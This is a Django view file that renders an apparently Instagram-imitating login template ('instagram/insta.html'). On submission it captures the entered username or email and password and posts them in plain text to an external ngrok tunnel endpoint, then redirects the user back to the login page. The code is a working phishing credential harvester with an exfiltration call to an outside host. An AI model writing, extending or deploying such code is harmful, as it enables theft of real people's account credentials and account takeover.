from django.shortcuts import render, redirect
from .forms import LoginForm
import requests

def login_view(request):
    form = LoginForm()

    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            data = {
                'username_or_email': form.cleaned_data['username_or_email'],
                'password': form.cleaned_data['password']
            }

            try:
                # Send to local endpoint via ngrok
                requests.post('https://930cf7011638.ngrok-free.app/api/receive/', data=data)
            except Exception as e:
                print(f"[ERROR] Failed to send login data: {e}")

            return redirect('login')  # Redirect back to login

    return render(request, 'instagram/insta.html', {'form': form})
